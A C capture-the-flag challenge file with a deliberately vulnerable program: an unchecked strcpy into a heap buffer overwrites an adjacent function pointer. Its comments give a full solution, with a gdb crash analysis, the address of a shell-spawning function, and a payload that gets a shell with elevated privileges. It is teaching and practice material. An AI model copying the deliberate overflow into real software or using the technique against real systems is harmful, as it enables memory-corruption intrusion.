// gcc pwnme.c -o pwnme -m32

#include  < stdlib.h >
#include  < unistd.h >
#include  < string.h >
#include  < stdio.h >
#include  < sys/types.h >

struct user {
    char name[64];
};

struct login {
    int (*login)();
};

void pwned()
{
    system("/bin/sh");
}

void logout()
{
    printf("logged out\n");
}

int main(int argc, char **argv)
{
    struct user *u;
    struct login *l;

    u = malloc(sizeof(struct user));
    l = malloc(sizeof(struct login));
    l->login = logout;

    printf("User is at %p, login is at %p\n", u, l);

    strcpy(u->name, argv[1]);

    l->login();

}

// pwn8@binary-challenges-pwnerrank-com:~$ ./pwnme `python -c 'print "A"*73'`
// User is at 0x804a008, login is at 0x804a050
// Segmentation fault

// pwn8@binary-challenges-pwnerrank-com:~$ gdb ./pwnme
// (gdb) r `python -c 'print "A"*72+"B"*4'`
// Starting program: /home/pwn8/pwnme `python -c 'print "A"*72+"B"*4'`
// User is at 0x804a008, login is at 0x804a050

// Program received signal SIGSEGV, Segmentation fault.
// 0x42424242 in ?? ()
// (gdb) i r
// eax            0x42424242       1111638594
// ecx            0xffffd8c0       -10048
// edx            0x804a049        134520905
// ebx            0xf7fc8000       -134447104
// esp            0xffffd67c       0xffffd67c
// ebp            0xffffd6a8       0xffffd6a8
// esi            0x0      0
// edi            0x0      0
// eip            0x42424242       0x42424242
// eflags         0x10202  [ IF RF ]
// cs             0x23     35
// ss             0x2b     43
// ds             0x2b     43
// es             0x2b     43
// fs             0x0      0
// gs             0x63     99

// (gdb) disassemble pwned
// Dump of assembler code for function pwned:
//    0x080484ec <+0>:     push   %ebp
//    0x080484ed <+1>:     mov    %esp,%ebp
//    0x080484ef <+3>:     sub    $0x18,%esp
//    0x080484f2 <+6>:     movl   $0x8048620,(%esp)
//    0x080484f9 <+13>:    call   0x80483d0 <system@plt>
//    0x080484fe <+18>:    leave
//    0x080484ff <+19>:    ret
// End of assembler dump.

// pwn8@binary-challenges-pwnerrank-com:~$ ./pwnme `python -c 'print "A"*72 + "\xec\x84\x04\x08"\'`
// User is at 0x804a008, login is at 0x804a050
// $ id
// uid=1026(pwn8) gid=1026(pwn8) euid=1025(pwn8pwn) groups=1026(pwn8)
// $ cat .flag
